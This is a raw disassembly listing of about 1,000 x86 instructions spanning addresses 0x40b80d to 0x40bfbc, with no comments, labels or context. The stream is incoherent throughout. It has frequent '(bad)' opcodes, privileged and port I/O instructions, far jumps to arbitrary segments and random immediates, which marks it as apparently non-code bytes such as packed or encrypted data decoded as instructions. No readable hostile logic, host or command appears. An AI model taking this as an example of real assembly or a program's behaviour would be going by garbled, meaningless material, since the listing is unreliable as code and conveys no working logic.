  40b80d:	dec    ebp
  40b80e:	xchg   esp,eax
  40b80f:	or     DWORD PTR [esi+0x3c],edi
  40b812:	repnz cli 
  40b814:	pop    edi
  40b815:	sub    eax,0x9a336b00
  40b81a:	lock fdiv DWORD PTR [esi+0xa77faf5]
  40b821:	(bad)  
  40b822:	loopne 0x40b7da
  40b824:	mov    al,0x95
  40b826:	popa   
  40b827:	sub    ebp,DWORD PTR [ebx+0x70]
  40b82a:	ficom  WORD PTR [ebx-0x6c]
  40b82d:	pop    eax
  40b82e:	ss retf 
  40b830:	popf   
  40b831:	mov    esi,0x96344dfe
  40b836:	(bad)  
  40b837:	data16 mov al,ds:0x28198918
  40b83d:	aas    
  40b83e:	in     al,0x75
  40b840:	xchg   DWORD PTR [edx+0x6faf07a7],ecx
  40b846:	lea    eax,[edi]
  40b848:	ja     0x40b8be
  40b84a:	push   edx
  40b84b:	test   DWORD PTR [esi+0x1d],edx
  40b84e:	push   0xfffffff7
  40b850:	jg     0x40b83c
  40b852:	xlat   BYTE PTR ds:[ebx]
  40b853:	sbb    eax,eax
  40b855:	icebp  
  40b856:	in     al,0x34
  40b858:	lea    edi,[esi+0x2b]
  40b85b:	adc    BYTE PTR [eax+0x22],ch
  40b85e:	mov    DWORD PTR [edi-0x58],esp
  40b861:	test   BYTE PTR ds:0x84188a9d,0xa6
  40b868:	xchg   BYTE PTR [ebx],ah
  40b86a:	mov    ebp,0x7985f17b
  40b86f:	enter  0xe468,0x35
  40b873:	pushf  
  40b874:	mov    al,BYTE PTR [ecx+0x2]
  40b877:	mov    dh,0x75
  40b879:	or     al,0xcc
  40b87b:	jl     0x40b8f1
  40b87d:	sti    
  40b87e:	push   0x69b1b2d0
  40b883:	scas   al,BYTE PTR es:[edi]
  40b884:	push   edx
  40b885:	add    dh,al
  40b887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b888:	push   esi
  40b889:	pushf  
  40b88a:	jge    0x40b8e4
  40b88c:	dec    edx
  40b88d:	jo     0x40b873
  40b88f:	xor    dl,BYTE PTR [ecx+0x39]
  40b892:	(bad)  
  40b893:	leave  
  40b894:	sbb    cl,BYTE PTR [ecx+ecx*4+0x20a92877]
  40b89b:	xor    eax,0xab70113
  40b8a0:	jmp    0x421a4422
  40b8a5:	push   cs
  40b8a6:	je     0x40b84a
  40b8a8:	inc    edi
  40b8a9:	add    DWORD PTR [esi],esi
  40b8ab:	cs sti 
  40b8ad:	jmp    0x34a61020
  40b8b2:	mov    eax,ds:0x4a49ef07
  40b8b7:	dec    edi
  40b8b8:	or     bl,BYTE PTR [edi-0x735257ca]
  40b8be:	imul   eax,esp,0xd3e0356f
  40b8c4:	je     0x40b93b
  40b8c6:	retf   0xaf23
  40b8c9:	sbb    eax,0x2b0abb
  40b8ce:	add    BYTE PTR [edi],dh
  40b8d0:	ficomp DWORD PTR ds:0xe3bd5888
  40b8d6:	inc    edx
  40b8d7:	inc    esp
  40b8d8:	(bad)  
  40b8da:	mov    ebp,0xc5a97f98
  40b8df:	push   ecx
  40b8e0:	xchg   ebx,eax
  40b8e1:	add    DWORD PTR [edx+0x70],ecx
  40b8e4:	xchg   edx,eax
  40b8e5:	cdq    
  40b8e6:	fadd   DWORD PTR [ebp-0x1ce9c766]
  40b8ec:	pop    esp
  40b8ed:	inc    edx
  40b8ee:	jecxz  0x40b906
  40b8f0:	popfw  
  40b8f2:	pop    es
  40b8f3:	loop   0x40b93e
  40b8f5:	add    al,0x67
  40b8f7:	lds    eax,FWORD PTR [edx+ebp*4+0x54]
  40b8fb:	dec    edi
  40b8fc:	out    0x34,al
  40b8fe:	aas    
  40b8ff:	cli    
  40b900:	(bad)
  40b904:	or     al,0x22
  40b906:	mov    ch,0x5b
  40b908:	jmp    0x8619:0x9ef36233
  40b90f:	(bad)  
  40b910:	shl    ebx,1
  40b912:	pop    sp
  40b914:	jb     0x40b89a
  40b916:	imul   esp,DWORD PTR [eax+0x78],0x4615ba36
  40b91d:	bound  ebp,QWORD PTR [ebx]
  40b91f:	leave  
  40b920:	xchg   edx,eax
  40b921:	clc    
  40b922:	jo     0x40b932
  40b924:	aas    
  40b925:	mov    edi,0xade671ee
  40b92a:	sbb    BYTE PTR [ecx+ebx*1],0x40
  40b92e:	sub    esi,DWORD PTR [esi+0x74d77906]
  40b934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b935:	cdq    
  40b936:	and    bl,al
  40b938:	sub    eax,0xe97882c7
  40b93d:	pop    ds
  40b93e:	add    al,0x9c
  40b940:	push   edi
  40b941:	lgdtd  [ecx]
  40b944:	and    bh,dh
  40b946:	sub    BYTE PTR [ebx-0x57],bl
  40b949:	xor    al,0x10
  40b94b:	mov    edi,0x74fe8b0e
  40b950:	ficomp DWORD PTR [ebp+0x24]
  40b953:	(bad)  
  40b954:	pop    edx
  40b955:	or     eax,0x5da39d81
  40b95a:	fstp   DWORD PTR [esp+eax*8+0x650eb660]
  40b961:	jp     0x40b967
  40b963:	inc    edi
  40b964:	and    DWORD PTR [edx+0x66],0xffffffee
  40b968:	push   edi
  40b969:	cmp    DWORD PTR [ebx+0x76d98230],ebp
  40b96f:	dec    ebx
  40b970:	sub    DWORD PTR [ebx+0x31],0x3ed566f1
  40b977:	rcl    BYTE PTR [eax-0x28],cl
  40b97a:	xor    DWORD PTR [ebx],edi
  40b97c:	dec    ebp
  40b97d:	and    dh,dl
  40b97f:	pop    eax
  40b980:	test   BYTE PTR [ecx],0xd
  40b983:	cs leave 
  40b985:	jmp    0x40b96d
  40b987:	sbb    dh,BYTE PTR [edx]
  40b989:	lods   eax,DWORD PTR ds:[esi]
  40b98a:	jne    0x40ba01
  40b98c:	sar    DWORD PTR [ecx+0x69d7ac55],0xdc
  40b993:	es dec esp
  40b995:	xchg   ecx,eax
  40b996:	cmp    eax,0x8658323
  40b99b:	xchg   esi,eax
  40b99c:	or     ebp,edx
  40b99e:	in     eax,dx
  40b99f:	adc    ch,BYTE PTR [eax-0x1de0ddca]
  40b9a5:	fdivr  st,st(5)
  40b9a7:	dec    ebx
  40b9a8:	jmp    0xa645:0xd4a79b74
  40b9af:	fldcw  WORD PTR ds:0x7185ecb8
  40b9b5:	ja     0x40b99a
  40b9b7:	xor    DWORD PTR [eax+ebp*8],ebx
  40b9ba:	add    esi,DWORD PTR [ebp+0x21160deb]
  40b9c0:	sar    ecx,1
  40b9c2:	std    
  40b9c3:	std    
  40b9c4:	jg     0x40ba2f
  40b9c6:	mov    bh,0xa3
  40b9c8:	jno    0x40b979
  40b9ca:	les    ecx,FWORD PTR [edx-0x13]
  40b9cd:	ds and al,0x4
  40b9d0:	cs das 
  40b9d2:	push   edx
  40b9d3:	mov    esi,0xce5f4709
  40b9d8:	rcl    esp,0x38
  40b9db:	sbb    DWORD PTR [ebx+0x3a],ebp
  40b9de:	adc    eax,0x35ad51d9
  40b9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e4:	mov    bh,0x26
  40b9e6:	mov    ecx,0x423db6c
  40b9eb:	add    DWORD PTR [ebx-0x2e262ab1],esi
  40b9f1:	lds    cx,DWORD PTR [ebx]
  40b9f4:	pop    ss
  40b9f5:	aaa    
  40b9f6:	retf   
  40b9f7:	push   ds
  40b9f8:	xor    eax,0x60b0f4d7
  40b9fd:	gs (bad) 
  40b9ff:	push   edi
  40ba00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba01:	int    0x4
  40ba03:	cdq    
  40ba04:	dec    ebp
  40ba05:	sahf   
  40ba06:	in     al,0x74
  40ba08:	inc    eax
  40ba09:	push   esp
  40ba0a:	cmp    DWORD PTR [edi],esi
  40ba0c:	dec    esp
  40ba0d:	jnp    0x40b9b4
  40ba0f:	push   esp
  40ba10:	xchg   DWORD PTR [edx+0x5c706c6c],eax
  40ba16:	xor    al,0x2f
  40ba19:	test   eax,0xeb68c477
  40ba1e:	lods   al,BYTE PTR ds:[esi]
  40ba1f:	jg     0x40ba45
  40ba21:	push   esi
  40ba22:	cmp    ch,BYTE PTR [eax-0x5a]
  40ba25:	inc    edi
  40ba26:	mov    WORD PTR [eax+0x57],cs
  40ba29:	dec    eax
  40ba2a:	retf   0xab91
  40ba2d:	mov    ecx,0xf9a62918
  40ba32:	xchg   BYTE PTR [edx+0x39],ah
  40ba35:	and    ecx,0x13378af0
  40ba3b:	pop    edi
  40ba3c:	push   es
  40ba3d:	inc    ebp
  40ba3e:	adc    al,0xe5
  40ba40:	paddsw mm7,QWORD PTR [ebp-0x7e]
  40ba44:	loop   0x40ba07
  40ba46:	pusha  
  40ba47:	mov    eax,ds:0x2b399834
  40ba4c:	stos   DWORD PTR es:[edi],eax
  40ba4d:	adc    al,bl
  40ba4f:	or     eax,0x87f6e0d9
  40ba54:	mov    edi,0xfeb98106
  40ba59:	shr    edx,1
  40ba5b:	mov    eax,ds:0xe0cae648
  40ba60:	adc    DWORD PTR ds:0x6ebf104e,ebp
  40ba66:	lea    ebx,[ebx+0x11]
  40ba69:	les    edx,FWORD PTR [edi]
  40ba6b:	add    DWORD PTR [edi+0x26aa817c],ebx
  40ba71:	xchg   DWORD PTR [ebp-0x5d72f273],edi
  40ba77:	inc    eax
  40ba78:	into   
  40ba79:	icebp  
  40ba7a:	lea    ebp,[eax+0x1a]
  40ba7d:	push   edi
  40ba7e:	rcl    DWORD PTR [ebx+0x15],1
  40ba81:	pop    ebx
  40ba82:	or     edx,DWORD PTR [esi]
  40ba84:	dec    esi
  40ba85:	scas   eax,DWORD PTR es:[edi]
  40ba86:	xor    al,0x28
  40ba88:	xor    ah,dl
  40ba8a:	outs   dx,DWORD PTR ds:[esi]
  40ba8b:	and    al,0x1e
  40ba8d:	gs inc ecx
  40ba8f:	bound  edx,QWORD PTR [edi-0x5e]
  40ba92:	adc    edx,DWORD PTR [edx-0x64]
  40ba95:	arpl   WORD PTR [esi-0x7d],sp
  40ba98:	mov    DWORD PTR [edi+edi*1+0x6c],0x3537b3fa
  40baa0:	repnz xor al,BYTE PTR [esi+0xeaec7a]
  40baa7:	push   esi
  40baa8:	mov    BYTE PTR [ebp-0x508fc6ec],dh
  40baae:	pop    es
  40baaf:	sahf   
  40bab0:	ins    BYTE PTR es:[edi],dx
  40bab1:	and    dl,BYTE PTR [ecx+esi*8+0x401021fa]
  40bab8:	jmp    0xfe97:0x78cf5a8c
  40babf:	pop    eax
  40bac0:	repz pop ebp
  40bac2:	inc    ecx
  40bac3:	mov    bl,BYTE PTR [edx]
  40bac5:	inc    eax
  40bac6:	and    eax,0xe723d34d
  40bacb:	sbb    esp,DWORD PTR ds:0xb321c9bd
  40bad1:	leave  
  40bad2:	mov    bh,BYTE PTR [bx-0x24]
  40bad6:	or     esi,esi
  40bad8:	sbb    bh,al
  40bada:	pop    ecx
  40badb:	mov    edi,0xc59f45e2
  40bae0:	adc    al,0xd0
  40bae2:	pop    DWORD PTR ds:0xf3afc19b
  40bae8:	inc    eax
  40bae9:	inc    edi
  40baea:	jns    0x40bb49
  40baec:	and    ecx,DWORD PTR [ecx+0x3fdd58f0]
  40baf2:	xor    edx,DWORD PTR [edx-0x18]
  40baf5:	push   edx
  40baf6:	inc    eax
  40baf7:	sar    cl,0xb8
  40bafa:	adc    DWORD PTR [ebx],0x66
  40bafd:	mov    ebx,0x5e54f4ca
  40bb02:	out    0x5,al
  40bb04:	or     al,0xbb
  40bb06:	call   0x2104:0x6f7d8361
  40bb0d:	(bad)  
  40bb0e:	and    ch,BYTE PTR [eax]
  40bb10:	test   BYTE PTR ds:0xc56ebe1e,bh
  40bb16:	das    
  40bb17:	mov    al,ds:0x1212c3b9
  40bb1c:	sbb    BYTE PTR [ebx+0x79],al
  40bb1f:	iret   
  40bb20:	xlat   BYTE PTR ds:[ebx]
  40bb21:	push   ebp
  40bb22:	jg     0x40bb8e
  40bb24:	jb     0x40bb90
  40bb26:	mov    al,ds:0x1d569610
  40bb2c:	sub    DWORD PTR [ebp+0x51],ebp
  40bb2f:	and    esp,edi
  40bb31:	xor    dl,dl
  40bb33:	jmp    0x40badd
  40bb35:	mov    WORD PTR [ecx-0x364d1c44],?
  40bb3b:	enter  0x55b1,0x72
  40bb3f:	dec    edx
  40bb40:	pop    edi
  40bb41:	mov    ebp,0x786da41e
  40bb46:	fs adc al,0xe2
  40bb49:	int    0x1
  40bb4b:	mov    esi,edx
  40bb4d:	lahf   
  40bb4e:	shl    ebx,0x3e
  40bb51:	inc    ebx
  40bb52:	fadd   DWORD PTR [ecx+0x4767a9a7]
  40bb58:	sub    DWORD PTR [ecx-0x58],eax
  40bb5b:	push   ss
  40bb5c:	mov    eax,ds:0x73f6b727
  40bb61:	sbb    eax,0x87ef2378
  40bb66:	test   al,0x1f
  40bb68:	ja     0x40bbd5
  40bb6a:	jp     0x40bb4a
  40bb6c:	inc    ebp
  40bb6d:	test   DWORD PTR [esp+edx*2],edi
  40bb70:	adc    ch,BYTE PTR [ecx+0x3]
  40bb73:	enter  0xac8d,0xd8
  40bb77:	mov    dl,0x2c
  40bb79:	push   ecx
  40bb7a:	mov    dh,0xf8
  40bb7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7d:	pop    esi
  40bb7e:	xchg   BYTE PTR [edx],dh
  40bb80:	lds    edi,FWORD PTR [ebx+0x5a9de878]
  40bb86:	scas   eax,DWORD PTR es:[edi]
  40bb87:	gs xor eax,0xe86ff971
  40bb8d:	push   ecx
  40bb8e:	inc    eax
  40bb8f:	retf   0x254d
  40bb92:	or     al,0x64
  40bb94:	mov    esi,0xb71b7b8b
  40bb99:	push   0xffffff93
  40bb9b:	sahf   
  40bb9c:	scas   al,BYTE PTR es:[edi]
  40bb9d:	iret   
  40bb9e:	imul   eax
  40bba0:	mov    DWORD PTR [esi-0x1a],edi
  40bba3:	add    eax,DWORD PTR [ebp-0x4714da33]
  40bba9:	(bad)  
  40bbaa:	xchg   ecx,eax
  40bbab:	leave  
  40bbac:	pushf  
  40bbad:	mov    edi,ebx
  40bbaf:	(bad)  
  40bbb1:	stc    
  40bbb2:	out    0xc,eax
  40bbb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb5:	sbb    BYTE PTR [esi+0x1376b6e9],ch
  40bbbb:	sti    
  40bbbc:	cld    
  40bbbd:	mov    edx,0x88d37e3e
  40bbc2:	inc    esp
  40bbc3:	fistp  QWORD PTR [ebx]
  40bbc5:	add    eax,0xc28f3956
  40bbca:	xor    DWORD PTR [ecx-0x57],ebp
  40bbcd:	or     bl,BYTE PTR es:[eax-0x4754f7df]
  40bbd4:	std    
  40bbd5:	sbb    dl,bl
  40bbd7:	mov    ds:0x8a08f08e,eax
  40bbdc:	das    
  40bbdd:	cs jp  0x40bb82
  40bbe0:	push   esi
  40bbe1:	mov    DWORD PTR [edi+0x38aa5897],0x5a45fac8
  40bbeb:	sub    al,dl
  40bbed:	sub    ebx,ecx
  40bbef:	or     bl,dl
  40bbf1:	push   ds
  40bbf2:	retf   
  40bbf3:	mov    WORD PTR [ebx-0x13c1baee],?
  40bbf9:	stos   BYTE PTR es:[edi],al
  40bbfa:	or     eax,0xef28d4ee
  40bbff:	sbb    eax,0x1ade7cbb
  40bc04:	jl     0x40bc5c
  40bc06:	lock or eax,0xa1b0df9
  40bc0c:	sbb    eax,DWORD PTR [ebx-0x53698167]
  40bc12:	aam    0x29
  40bc14:	push   esp
  40bc15:	and    edx,DWORD PTR ds:0x8eb52fbf
  40bc1b:	lods   eax,DWORD PTR ds:[esi]
  40bc1c:	dec    edi
  40bc1d:	jbe    0x40bba6
  40bc1f:	mov    bh,cl
  40bc21:	add    bh,BYTE PTR [esi+0x1a8c2efc]
  40bc27:	mov    esp,ecx
  40bc29:	outs   dx,DWORD PTR ds:[esi]
  40bc2a:	and    BYTE PTR [edi],bl
  40bc2c:	lods   eax,DWORD PTR ds:[esi]
  40bc2d:	adc    ebx,DWORD PTR [ebx+0x2f3f060c]
  40bc33:	jo     0x40bc09
  40bc35:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40bc37:	scas   eax,DWORD PTR es:[edi]
  40bc38:	xor    bh,ch
  40bc3a:	(bad)  
  40bc3b:	sub    al,0xb2
  40bc3d:	xor    eax,0xc7c3b695
  40bc42:	paddsw mm5,mm6
  40bc45:	(bad)  
  40bc46:	ja     0x40bc6f
  40bc48:	fnstsw WORD PTR [eax-0x31]
  40bc4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc4c:	(bad)  
  40bc4d:	push   edx
  40bc4e:	arpl   WORD PTR [ebp+ebx*8+0x13e49c95],di
  40bc55:	imul   edi,DWORD PTR [ecx+0x574d475c],0x92b55248
  40bc5f:	pop    esp
  40bc60:	(bad)  [ebx-0x708c2f4f]
  40bc66:	pusha  
  40bc67:	push   0x7d8d8a37
  40bc6c:	xchg   esp,eax
  40bc6d:	iret   
  40bc6e:	inc    ebp
  40bc6f:	mov    ebp,0x231b8d1c
  40bc74:	push   ds
  40bc75:	(bad)  
  40bc76:	jle    0x40bc65
  40bc78:	fsubr  QWORD PTR [edx+0x54]
  40bc7b:	pop    esi
  40bc7c:	xchg   esi,eax
  40bc7d:	js     0x40bc55
  40bc7f:	repnz test eax,0x85e71f9b
  40bc85:	push   fs
  40bc87:	cld    
  40bc88:	push   ebp
  40bc89:	mov    bl,0x4a
  40bc8b:	xor    BYTE PTR [ebp+0x70],dh
  40bc8e:	sbb    esi,DWORD PTR [esp+ebx*2-0x88f65bb]
  40bc95:	jge    0x40bd0d
  40bc97:	or     bh,BYTE PTR [ecx+edi*4]
  40bc9a:	xor    al,0xb1
  40bc9c:	loop   0x40bcd5
  40bc9e:	jmp    0x4d642240
  40bca3:	dec    ebx
  40bca4:	or     al,0x59
  40bca6:	mov    al,0xd5
  40bca8:	jg     0x40bd07
  40bcaa:	dec    esp
  40bcab:	call   0x27b6b91c
  40bcb0:	push   ds
  40bcb1:	das    
  40bcb2:	ja     0x40bce5
  40bcb4:	mov    BYTE PTR [eax+0x62],cl
  40bcb7:	push   ds
  40bcb8:	adc    eax,0xe2ddab42
  40bcbd:	mov    esp,0xfe0456ed
  40bcc2:	jle    0x40bc44
  40bcc4:	ins    DWORD PTR es:[edi],dx
  40bcc5:	jb     0x40bcd5
  40bcc7:	inc    DWORD PTR [esi+0xc]
  40bcca:	add    eax,0x4cd01e5f
  40bccf:	ins    BYTE PTR es:[edi],dx
  40bcd0:	mov    WORD PTR [eax+ebp*1],cs
  40bcd3:	mov    eax,0xd1a14325
  40bcd8:	add    BYTE PTR [edx+0x67],dh
  40bcdb:	scas   eax,DWORD PTR es:[edi]
  40bcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcdd:	rcl    BYTE PTR [ebp-0xb27d5bc],1
  40bce3:	in     eax,dx
  40bce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce5:	sar    BYTE PTR [ebx-0xd2c5659],cl
  40bceb:	or     DWORD PTR [ebx-0x5a071209],eax
  40bcf1:	and    BYTE PTR [ebp+0x2a78c5ec],ch
  40bcf7:	nop
  40bcf8:	adc    ch,BYTE PTR [esi]
  40bcfa:	loopne 0x40bd35
  40bcfc:	fidiv  DWORD PTR [eax-0x5eadae8d]
  40bd02:	pop    esi
  40bd03:	jmp    0x40bc8d
  40bd05:	mov    eax,ds:0xb77c38dd
  40bd0a:	mov    edi,0x5b62e5e1
  40bd0f:	jmp    0x40bd3d
  40bd11:	and    DWORD PTR [edi],0x7d
  40bd14:	cmp    al,0x75
  40bd16:	jecxz  0x40bd3b
  40bd18:	add    ah,BYTE PTR [esi+0x51]
  40bd1b:	sar    dl,0x27
  40bd1e:	and    esi,DWORD PTR [esi+0x3d34291a]
  40bd24:	mov    dl,dl
  40bd26:	and    eax,0xb96d67bf
  40bd2b:	adc    al,0x8b
  40bd2d:	xor    DWORD PTR [edi+0x79c53c9d],0xffffffa3
  40bd34:	xchg   ebp,eax
  40bd35:	aad    0xd2
  40bd37:	and    BYTE PTR [esp+esi*8-0x61052d30],al
  40bd3e:	(bad)  
  40bd3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd40:	shr    ebx,0x55
  40bd43:	sti    
  40bd44:	add    bl,bl
  40bd46:	push   ds
  40bd47:	aad    0xff
  40bd49:	xchg   ecx,eax
  40bd4a:	and    DWORD PTR [edi+0x1eee5838],eax
  40bd50:	les    ecx,FWORD PTR [ebx-0x54cea366]
  40bd56:	into   
  40bd57:	and    al,0x5b
  40bd59:	dec    esp
  40bd5a:	mov    ecx,0x7894878
  40bd5f:	jbe    0x40bce8
  40bd61:	ds inc ebp
  40bd63:	sub    ecx,eax
  40bd65:	fsubr  DWORD PTR [ebx+edx*4-0x18a56538]
  40bd6c:	fs push 0x5cfeb0af
  40bd72:	ds inc esi
  40bd74:	fstp   TBYTE PTR [edi+0x4174a5e5]
  40bd7a:	dec    esi
  40bd7b:	mov    dl,0xac
  40bd7d:	lock in al,0xac
  40bd80:	out    0x77,eax
  40bd82:	mov    al,0xc2
  40bd84:	jg     0x40bdcd
  40bd86:	ins    BYTE PTR es:[edi],dx
  40bd87:	push   eax
  40bd88:	pop    eax
  40bd89:	mov    esp,0xde3741c8
  40bd8e:	or     bl,BYTE PTR [esi-0x1e]
  40bd91:	sbb    eax,edx
  40bd93:	sub    ch,BYTE PTR [eax+0x6d]
  40bd96:	mov    edx,0xcd35a0bd
  40bd9b:	bound  edx,QWORD PTR [eax+0x30]
  40bd9e:	push   ebx
  40bd9f:	inc    esi
  40bda0:	lods   al,BYTE PTR ds:[esi]
  40bda1:	test   eax,0xf6e36998
  40bda6:	jo     0x40bdc8
  40bda8:	data16 sbb al,0x50
  40bdab:	das    
  40bdac:	fs fwait
  40bdae:	sahf   
  40bdaf:	and    eax,DWORD PTR ds:0xadb94fd8
  40bdb5:	jnp    0x40bdc9
  40bdb7:	jmp    0x6eb4:0x7c899e2d
  40bdbe:	sub    DWORD PTR [ecx],eax
  40bdc0:	(bad)  
  40bdc1:	fisubr DWORD PTR ds:0xaf5cf414
  40bdc7:	cli    
  40bdc8:	xchg   BYTE PTR [edi+0xbe4ac7f],dl
  40bdce:	lea    ebx,[edx+0x514e7808]
  40bdd4:	and    eax,0x59adf905
  40bdd9:	mov    ecx,gs
  40bddb:	mov    edi,edx
  40bddd:	inc    ebp
  40bdde:	test   BYTE PTR [eax+edi*8-0x46],ch
  40bde2:	fidivr DWORD PTR ds:0xd8453bdb
  40bde8:	sub    BYTE PTR [esp+edi*2+0x26b2f2c4],0x6b
  40bdf0:	xchg   ebx,eax
  40bdf1:	inc    ebx
  40bdf2:	lods   eax,DWORD PTR ds:[esi]
  40bdf3:	jp     0x40bdec
  40bdf5:	or     eax,0x7ac5ea2a
  40bdfa:	mov    BYTE PTR [eax],cl
  40bdfc:	adc    al,0x3a
  40bdfe:	and    cl,dl
  40be00:	leave  
  40be01:	push   0x9f5068fb
  40be06:	call   FWORD PTR ds:0xd6993b69
  40be0c:	cwde   
  40be0d:	ins    BYTE PTR es:[edi],dx
  40be0e:	dec    esp
  40be0f:	fstp   QWORD PTR [eax]
  40be11:	jo     0x40be64
  40be13:	stos   DWORD PTR es:[edi],eax
  40be14:	lods   eax,DWORD PTR ds:[esi]
  40be15:	push   ds
  40be16:	jp     0x40be7b
  40be18:	add    ecx,ebx
  40be1a:	and    al,0x1
  40be1c:	push   es
  40be1d:	cmp    DWORD PTR [eax],esi
  40be1f:	mov    esi,ecx
  40be21:	xor    al,0xd0
  40be23:	or     esi,DWORD PTR [edx]
  40be25:	stos   BYTE PTR es:[edi],al
  40be26:	fs push edi
  40be28:	sbb    ebx,esp
  40be2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2b:	adc    eax,0x1b4d3ce
  40be30:	daa    
  40be31:	fmul   QWORD PTR cs:[edx]
  40be34:	les    ebp,FWORD PTR [ecx]
  40be36:	jecxz  0x40be02
  40be38:	or     bl,bl
  40be3a:	jns    0x40bdcf
  40be3c:	push   esi
  40be3d:	cmp    BYTE PTR [edi-0x54f0c74f],0xa8
  40be44:	int    0xe9
  40be46:	mov    ebp,0xaa1401e
  40be4b:	pushaw 
  40be4d:	cli    
  40be4e:	arpl   WORD PTR [ebx-0x45],ax
  40be51:	dec    ebx
  40be52:	cmp    BYTE PTR [ebx],cl
  40be54:	mov    DWORD PTR [eax+0x617e9c59],edx
  40be5a:	cdq    
  40be5b:	imul   edi,DWORD PTR [ecx+edi*4-0x5b],0x2a
  40be60:	sbb    ebp,DWORD PTR [ecx]
  40be62:	aad    0x8e
  40be64:	pop    eax
  40be65:	push   ds
  40be66:	xlat   BYTE PTR ds:[ebx]
  40be67:	push   esp
  40be68:	ja     0x40be4a
  40be6a:	mov    eax,0x61f79c35
  40be6f:	push   edi
  40be70:	jbe    0x40be49
  40be72:	in     eax,0x26
  40be74:	jle    0x40bebf
  40be76:	cmp    esi,esi
  40be78:	rol    DWORD PTR [edx+ecx*2+0x48],1
  40be7c:	inc    esp
  40be7d:	inc    ebx
  40be7e:	add    DWORD PTR [ebp+0x39],0xffffffda
  40be82:	dec    esp
  40be83:	mov    BYTE PTR [edi-0x7fac6b2e],ch
  40be89:	mov    eax,cs:0x6c542818
  40be8f:	xor    BYTE PTR [ecx+edx*2],dh
  40be92:	mov    ch,bl
  40be94:	gs push ds
  40be96:	fcmovu st,st(4)
  40be98:	mov    ebx,0xfad51672
  40be9d:	pop    edx
  40be9e:	adc    esp,DWORD PTR [edx-0x23f836d4]
  40bea4:	das    
  40bea5:	popf   
  40bea6:	rcr    BYTE PTR [esi+0x37c54773],1
  40beac:	push   edi
  40bead:	mov    esi,0x8470cdc7
  40beb2:	mov    ebx,0x699ac8a7
  40beb7:	test   ebx,eax
  40beb9:	clc    
  40beba:	push   0x93c3aa51
  40bebf:	mov    bh,BYTE PTR fs:[ebp-0x7]
  40bec3:	daa    
  40bec4:	jp     0x40bf30
  40bec6:	or     DWORD PTR [ebp+0x3e],0xffffff97
  40beca:	and    DWORD PTR [esi+0x63e3c03],esp
  40bed0:	out    dx,al
  40bed1:	add    eax,0xf2405bc4
  40bed6:	adc    al,0x45
  40bed8:	leave  
  40bed9:	xor    bl,dh
  40bedb:	mov    ds:0xefd1d139,eax
  40bee0:	ret    
  40bee1:	or     esi,DWORD PTR [ecx+0x2f3e334f]
  40bee7:	jbe    0x40bf24
  40bee9:	in     al,0x7a
  40beeb:	retf   
  40beec:	fld    st(0)
  40beee:	test   eax,0xe8d376f
  40bef3:	pop    ebp
  40bef4:	lds    ecx,FWORD PTR [ebp+ebp*1+0x3f2626b3]
  40befb:	fld    TBYTE PTR [edx+0x2c]
  40befe:	fnsave [ebx-0x2846cbc5]
  40bf04:	aam    0xf1
  40bf06:	jl     0x40bebe
  40bf08:	xor    BYTE PTR [edi-0x72],0x64
  40bf0c:	jge    0x40beb7
  40bf0e:	sahf   
  40bf0f:	mul    DWORD PTR [ecx-0x20]
  40bf12:	cmp    al,BYTE PTR [ecx-0x6b32dd13]
  40bf18:	or     BYTE PTR [edx+ebp*8],dl
  40bf1b:	mov    esp,DWORD PTR [edx+0x54]
  40bf1e:	fs or  al,0x22
  40bf21:	or     eax,0x31154d46
  40bf26:	jl     0x40beee
  40bf28:	and    eax,0x2d3e178c
  40bf2d:	(bad)  
  40bf2e:	call   0x385e34b
  40bf33:	(bad)  
  40bf34:	xchg   ebp,eax
  40bf35:	push   ebp
  40bf36:	sbb    al,0xa3
  40bf38:	scas   eax,DWORD PTR es:[edi]
  40bf39:	aam    0xcd
  40bf3b:	lea    edx,[edx]
  40bf3d:	fisttp QWORD PTR [ecx-0x3158e9f4]
  40bf43:	fadd   QWORD PTR [esi-0x27]
  40bf46:	and    BYTE PTR [edx+eiz*2-0x5a],dh
  40bf4a:	shr    BYTE PTR [ecx],cl
  40bf4c:	addr16 in al,0xe0
  40bf4f:	jl     0x40bf18
  40bf51:	imul   edx,DWORD PTR [edx+ebp*1-0x6086d75],0xffffff86
  40bf59:	(bad)  [edx+0x75]
  40bf5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf5d:	pop    edi
  40bf5e:	dec    eax
  40bf5f:	mov    edi,0x35d49245
  40bf64:	inc    esp
  40bf65:	test   al,0xf9
  40bf67:	call   0xea85:0x3a61a376
  40bf6e:	cmc    
  40bf6f:	mov    ebp,0xa1afb1c7
  40bf74:	sub    al,BYTE PTR [eax+0x5e]
  40bf77:	pop    ds
  40bf78:	dec    edi
  40bf79:	jl     0x40bf16
  40bf7b:	ficomp DWORD PTR [ebp-0x49]
  40bf7e:	mov    dl,0xc5
  40bf80:	popa   
  40bf81:	dec    ebx
  40bf82:	xor    cl,dl
  40bf84:	jae    0x40bfba
  40bf86:	aam    0x0
  40bf88:	test   eax,0xdf1c019c
  40bf8d:	adc    al,0xbe
  40bf8f:	add    BYTE PTR [ebx],al
  40bf91:	fidivr WORD PTR [eax]
  40bf93:	out    0xbf,al
  40bf95:	inc    edx
  40bf96:	push   ss
  40bf97:	into   
  40bf98:	lds    ebp,FWORD PTR [esi+0x2b81fafd]
  40bf9e:	adc    cl,ah
  40bfa0:	cmc    
  40bfa1:	stc    
  40bfa2:	call   0x3ffe58b9
  40bfa7:	jno    0x40bf4c
  40bfa9:	mov    al,ds:0x557c8441
  40bfae:	xchg   ecx,eax
  40bfaf:	inc    edi
  40bfb0:	cmp    DWORD PTR [edx],eax
  40bfb2:	mov    al,0x49
  40bfb4:	jbe    0x40bf88
  40bfb6:	out    0x42,al
  40bfb8:	cwde   
  40bfb9:	ror    DWORD PTR [ecx-0x19],cl
  40bfbc:	in     eax,0x31
